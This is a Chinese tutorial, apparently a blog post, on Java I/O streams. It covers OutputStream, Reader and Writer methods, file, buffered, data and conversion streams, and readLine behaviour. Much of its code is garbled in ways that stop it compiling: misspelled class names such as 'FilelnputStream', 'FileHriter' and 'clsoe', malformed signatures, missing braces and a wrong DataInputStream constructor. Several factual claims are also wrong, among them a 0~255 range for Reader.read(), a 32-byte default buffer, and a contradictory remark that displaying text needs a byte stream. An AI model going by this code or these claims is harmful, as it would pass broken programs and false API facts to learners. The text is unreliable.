<h2 id="OutputStream流中常用的方法"><a href="#OutputStream流中常用的方法" class="headerlink" title="OutputStream流中常用的方法"></a>OutputStream流中常用的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向输出流中写入一个字节数据，该字节数据为参数b的低8位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字节类型的数组中的数据写入输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span> <span class="params">(<span class="keyword">byte</span>[] b)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字节类型的数组中的从指定位置（off）开始的len个字节写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span> <span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//关闭流释放内存资源</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span><span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将输出流中缓冲的数据全部写出到目的地</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush</span><span class="params">(<span class="keyword">throws</span> IOException</span></span></span><br></pre></td></tr></table></figure>

<p><strong>所有的输入流是没有flusch方法，输出流才有flush方法</strong></p>
<h2 id="Reader流的常用方法"><a href="#Reader流的常用方法" class="headerlink" title="Reader流的常用方法"></a>Reader流的常用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取一个字符并以整数的形式返回(0~255)，如果返回-1已到输入流的末尾。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//读取一系列字符并存储到一个数组buffer,返回实际读取的字符数，如果读取前已到输入流的末尾返回-1</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span> <span class="params">(<span class="keyword">char</span>[] cbuf)</span><span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//最多读取length个字符,并存储到一个数组buffer从length位置开始,返回实际读取的字符数，如果读取前以到输入流的末尾返回-1</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">char</span>[] cbuf, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//关闭流释放内存资源</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//跳过n个字符不读,返回实际跳过的字节数</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">skip</span><span class="params">(<span class="keyword">long</span> n)</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<h2 id="Writer流中常用方法"><a href="#Writer流中常用方法" class="headerlink" title="Writer流中常用方法"></a>Writer流中常用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向输出流中写入一个字符数据，该字节数据为参数b的低16位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> c)</span><span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符类型的数组中的数据写入输出流,</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span>[]cbuf)</span> <span class="keyword">throws</span> IOException1</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符类型的数组中的从指定位置(offset）开始的length个字符写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span>[]cbuf, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符串中的字符写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(String string)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="comment">//将一个字符串从offset开始的1ength个字符写入到输出流</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(String string, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//关闭流释放内存资源</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//将输出流中缓冲的数据全部写出到目的地</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestI0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">&quot;D:/share/S5/1.php&quot;</span>);</span><br><span class="line">		<span class="keyword">int</span> ch;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ch = fr.read();</span><br><span class="line">        <span class="keyword">while</span> (-<span class="number">1</span> !=ch)</span><br><span class="line">        &#123;</span><br><span class="line">			++cnt;</span><br><span class="line">			System.out.printf(<span class="string">&quot;%c&quot;</span>, (<span class="keyword">char</span>)ch);</span><br><span class="line">            ch = fr.read();</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.printf(<span class="string">&quot;该文件字符的个数是:%d\n&quot;</span>, cnt);</span><br><span class="line">        fr.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fr返回的是一个字符的编码对应的数字</p>
<p>输出文本使用字符流：</p>
<p>1.不会乱码</p>
<p>2.速度快</p>
<p><strong>字符流只能处理文本信息，字节流可以处理任何信息</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFileReaderHriterCopy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">&quot;D:\1.php&quot;</span>);</span><br><span class="line">        Filewriter fw = <span class="keyword">new</span> Filewriter(<span class="string">&quot;d:/zhangsan. haha&quot;</span>);</span><br><span class="line">		<span class="keyword">int</span> ch;</span><br><span class="line">        </span><br><span class="line">		ch = fr.read();</span><br><span class="line">        <span class="keyword">while</span> (-<span class="number">1</span> != ch)</span><br><span class="line">        &#123;</span><br><span class="line">			fw.write(ch);</span><br><span class="line">            ch = fr.read();</span><br><span class="line">		&#125;</span><br><span class="line">		fw.flush();</span><br><span class="line">        fr.clsoe();</span><br><span class="line">        fw.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    如果不刷新缓存器，内容可能写不进去，写完要刷新，有时候需要flush，有时候不需要，为了保证都先 flush() 再关闭，就不会出错</p>
<p><strong>文本文件复制拷贝可以使用字节流，但读取显示要字节流</strong></p>
<p> read() 返回的是原始文件二进制代码对应的字符</p>
<p>​    字符流不能处理非文本文件，文件本来不是一个字符，当成字符就会出错，存在编码解码问题</p>
<h2 id="字节流与字符流区别"><a href="#字节流与字符流区别" class="headerlink" title="字节流与字符流区别"></a>字节流与字符流区别</h2><ul>
<li><strong><code>FilelnputStream</code> 和 <code>FileOutputStream</code> 可以完成所有格式文件的赋值</strong></li>
<li><strong><code>FileReader</code> 和 <code>FileWriter</code> 只可以完成文本文件的复制，却无法完成视频格式文件的复制</strong></li>
<li>因为字节是不需要解码和编码的，将字节转化为字符才存在解码和解码的问题</li>
<li>字节流可以从所有格式的设备中读写数据，但字符流只能从文本格式的设备中读写数据</li>
</ul>
<h1 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h1><p>文件流包括<br>    <code>FilelnputStream Fileoutputstream</code>     —-字节流<br>    <code>FileReader FileWriter</code>                            —-字符流</p>
<h2 id="FilelnputStream的使用"><a href="#FilelnputStream的使用" class="headerlink" title="FilelnputStream的使用"></a>FilelnputStream的使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lnputStream   是用来读取字节的，是个抽象类，我们通常使用的是该类的子类</span><br><span class="line">    </span><br><span class="line">FilelnputStream 是 InputStream的子类，利用 FilelnputStream 可以将一个文件的内容按字节为单位读取出来</span><br><span class="line">    </span><br><span class="line">FilelnputStream 有一个很常用的构造函数</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">FilelnputStream</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function">    利用该构造函数可以实现将输入流连接到某个文件的功能</span></span><br><span class="line"><span class="function">	必须对本构造函数抛出的异常进行捕捉</span></span><br><span class="line"><span class="function">	如果用字符串来表示操作系统的文件路径时，我们可以使用\\ 和 /两种方式来作为文件夹的路径分隔符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">FileOutputStream 同理,不再赘述</span></span><br></pre></td></tr></table></figure>

<h2 id="FileReader的使用"><a href="#FileReader的使用" class="headerlink" title="FileReader的使用"></a>FileReader的使用</h2><ul>
<li>Reader 是用来读取字符的，是个抽象类，我们通常使用的是该类的子类</li>
<li>FileReader 是 Reader 的子类，利用 FileReader 可以将一个文件的内容以字符为单位读取出来</li>
<li>FileReader有一个很常用的构造函数</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileReader</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function">    利用该构造函数可以实现将输入流连接到某个文件的功能</span></span><br><span class="line"><span class="function">	必须对本构造函数抛出的异常进行捕捉</span></span><br><span class="line"><span class="function">	如果用字符串来表示操作系统的文件路径时，我们可以使用 \\ 和 / 两种方式来作为文件夹的路径分隔符</span></span><br></pre></td></tr></table></figure>

<ul>
<li>FileWriter 同理,不再赘述</li>
</ul>
<h1 id="缓存流"><a href="#缓存流" class="headerlink" title="缓存流"></a>缓存流</h1><ul>
<li>缓冲流就是带有缓冲区的输入输出流</li>
<li>缓冲流可以显著的减少我们对IO访问的次数，保护我们的硬盘</li>
<li>缓冲流本身就是处理流(处理流也叫包裹流)，缓冲流必须得依附于节点流{节点流也叫原始流)</li>
<li>处理流是包裹在原始节点流上的流,相当于包括在管道上的管道</li>
</ul>
<p>​    缓冲流要”套接”在相应的节点流之上，对读写的数据提供了缓冲的功能，提高了读写的效率，同时增加了一些新的方法。<br>  J2SDK提供了四种缓存流，其常用的构造方法为:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader(Reader in)</span><br><span class="line">BufferedReader(Reader in,<span class="keyword">int</span> sz) <span class="comment">//sz为自定义缓存区的大小</span></span><br><span class="line">Bufferedwriter(writer out)</span><br><span class="line">Bufferedwriter(writer out ,<span class="keyword">int</span> sz)</span><br><span class="line">BufferedInputstream(I nputstream in)</span><br><span class="line">BufferedInputstream(Inputstream in,<span class="keyword">int</span> size)</span><br><span class="line">Bufferedoutputstream(outputstream out)</span><br><span class="line">Bufferedoutputstream(outputstream out ,<span class="keyword">int</span> size)</span><br></pre></td></tr></table></figure>

<ul>
<li>缓冲输入流支持其父类的 mark 和 reset 方法。（mark是标记）</li>
<li>BufferedReader 提供了 readLine 方法用于读取一行字符串(以\r或\n分隔）。</li>
<li>Bufferedwriter提供了newLine用于写入一个行分隔符。</li>
<li>对于输出的缓冲流，写出的数据会先在内存中缓存，使用f1ush方法将会使内存中的数据立刻写出。</li>
</ul>
<h2 id="BufferedOutputStream-和-BufferedInputStream"><a href="#BufferedOutputStream-和-BufferedInputStream" class="headerlink" title="BufferedOutputStream 和 BufferedInputStream"></a>BufferedOutputStream 和 BufferedInputStream</h2><ul>
<li>BufferedOutputStream：带缓冲的输出流，允许一次向硬盘写入多个字节的数据</li>
<li>BufferedInputStream：带缓冲的输入流，允许一次向程序中读入多个字节的数据</li>
<li>BufferedOutputStream 和 BufferedlnputStream 都是包裹流,必须的依附于OutputStream和InputStream</li>
<li>例子:<ul>
<li>利用BufferedOutputStream和 BufferedInputStream完成大容量文件的复制，这远比单纯利用FilelnputStream 和 FileOutputStream要快得多</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(</span><br><span class="line">	<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\综艺\\电影\\猫和老鼠CD4.rmvb&quot;</span>)</span><br><span class="line">			);  <span class="comment">//bis输入流有个默认的缓冲区，大小为32个字节</span></span><br><span class="line"><span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> len = bis.read(buf, <span class="number">0</span>, <span class="number">1024</span>);</span><br></pre></td></tr></table></figure>

<p>​    <strong>要注意，bis.read(buf, 0, 1024); 这不是从buf中读数据，而是从bis所关联到的“D:\综艺\电影\猫和老鼠CD4.rmvb”文件中读取数据，并将读取的数据写入bis自己的默认缓冲区中，然后再将缓冲区的内容写入buf数组中，每次最多向buf数组中写入1024个字节，返回实际写入buf数组的字节个数，如果读到了文件的末尾，无法再向buf数组中写入数据,则返回-1</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream流中有</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(bytel b)</span></span></span><br><span class="line"><span class="function">	用来把从当前流关联到的设备中读取出来的数据存入一个<span class="keyword">byte</span>数组中</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">BufferedOutputStream流中有</span></span><br><span class="line"><span class="function">	<span class="keyword">public</span> <span class="keyword">int</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span> b)</span></span></span><br><span class="line"><span class="function">	用来把<span class="keyword">byte</span>数组中的数据输出到当前流所关联到的设备中</span></span><br></pre></td></tr></table></figure>

<p>如果我们希望用 BufferedInputStream 和 BufferedOutputStream 完成“将一个设备中的数据导入另一个设备中”，我们就应该定义一个临时的byte类型的数组，用这个临时数组作为输入流与输出流进行交互的中转枢纽</p>
<p>​    <strong>输入流 BufferedInputStream  和输出流BufferedOutputStream是如何产生关联的，靠什么连接一起，靠 buf，先把输入的数据放进 buf，输出流从 buf 读出数据，输出到输出流所连接的设备中</strong></p>
<p>​    BufferedInputstream BufferedoutputStream 要比 FilelnputStream File OutputStream读写数据的速度快</p>
<p><strong>我们只有</strong></p>
<ul>
<li>BufferedInputStream</li>
<li>BufferedOutputStream类</li>
<li>BufferedWriter</li>
<li>BufferedReader</li>
</ul>
<h2 id="BufferedReader-和-BufferedWriter"><a href="#BufferedReader-和-BufferedWriter" class="headerlink" title="BufferedReader 和 BufferedWriter"></a>BufferedReader 和 BufferedWriter</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">	<span class="keyword">new</span> FileReader(<span class="string">&quot;c:\\1.php&quot;</span>)</span><br><span class="line">    );</span><br><span class="line">bw = <span class="keyword">new</span> BufferedWriter(</span><br><span class="line">	<span class="keyword">new</span> FileHriter(<span class="string">&quot;d:/share/Hriter.txt&quot;</span>)</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">String str = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">null</span> != (str=br.readLine()))  <span class="comment">//br.readLine() 读取一行字符但不包括换行符，一个个读发现有换行符就把前面的字符返回，并自动丢弃换行符</span></span><br><span class="line">&#123;</span><br><span class="line">    bw.write(str);</span><br><span class="line">	bw.newLine();  <span class="comment">//写入一个换行符这行不能省</span></span><br><span class="line">&#125;</span><br><span class="line">bw.flush() ;</span><br></pre></td></tr></table></figure>

<h1 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h1><h2 id="DatalnputStream"><a href="#DatalnputStream" class="headerlink" title="DatalnputStream"></a>DatalnputStream</h2><p>​    DatalnputStream能够以一种与机器无关的方式，直接从底层字节输入流读取Java基本类型和Sring类型的数据，常用方法包括</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DatalnputStream</span><span class="params">(InputStream in)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">readBoolean</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> <span class="title">readByte</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">double</span> <span class="title">readDouble</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">float</span> <span class="title">readFloat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">readInt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">readLong</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">short</span> <span class="title">readShort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">readUTF</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>DatalnputStream是包裹流,必须依附于InputStream</p>
<h2 id="DataOutputStream"><a href="#DataOutputStream" class="headerlink" title="DataOutputStream"></a>DataOutputStream</h2><p>​    DataOutputStream能够以一种与机器无关的方式,直接将Java基本类型和String类型数据写出到其他的字节输出流。常见方法:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DataOutputStream</span><span class="params">(OutputStream in)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">writeBoolean</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> <span class="title">writeByte</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">char</span> <span class="title">writeChar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">double</span> <span class="title">writeDouble</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">float</span> <span class="title">writeFloat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">writelnt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">long</span> <span class="title">writeLong</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">short</span> <span class="title">writeShort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">writeUTF</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>DataOutputStream是包裹流，必须依附于OutputStream</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestData</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">	    <span class="keyword">long</span> m = <span class="number">1234567</span>;</span><br><span class="line">	    dos.writeLong(m)；</span><br><span class="line">            </span><br><span class="line">    	<span class="keyword">byte</span>[] buf2 = baos.toByteArray();</span><br><span class="line">        </span><br><span class="line">    	ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(buf2);</span><br><span class="line">        DatalnputStream dis = <span class="keyword">new</span> DatalnputStream (buf2);</span><br><span class="line">    	<span class="keyword">long</span> n;</span><br><span class="line">    	n = dis.readLong();</span><br><span class="line">    	<span class="comment">//dis.readLong(a); //error</span></span><br><span class="line">        </span><br><span class="line">    	System.out.println(<span class="string">&quot;n = &quot;</span> + n);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h1><ul>
<li>OutputStreamWriter 流是把OutputStream流转化成Writer流的流</li>
<li>InputStreamReader是把InputStream转化成ReaderOutputStreamWriter 和 </li>
<li>InputStreamReader都是包裹流</li>
<li>编程:<br>如何将键盘输入的字符组成字符串直接赋给String对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestString</span></span></span><br><span class="line">public static void main(String[]] args)</span><br><span class="line">&#123;</span><br><span class="line">    String str = <span class="keyword">null</span> ;</span><br><span class="line">	BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line">    str = br.readLine();</span><br><span class="line">	System.out.println(<span class="string">&quot;str = &quot;</span> + str) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="readLine-与回车符的问题"><a href="#readLine-与回车符的问题" class="headerlink" title="readLine()与回车符的问题"></a>readLine()与回车符的问题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">BufferedReader br =<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> lnputStreamReader(System.in));</span><br><span class="line">str = br.readLine();</span><br></pre></td></tr></table></figure>

<p>如果直接输入回车的话,则</p>
<ol>
<li>br.readLine()会丢弃回车符，而不是返回回车符，即br.readLine()遇到回车符时终止读取，并且会把读取到的回车符自动丢弃掉</li>
<li>br.readLine()返回的是“”而不是null，“”表示空字符串null表示空指针,空指针就是空地址，空地址就是不指向任何存储单元的意思</li>
</ol>
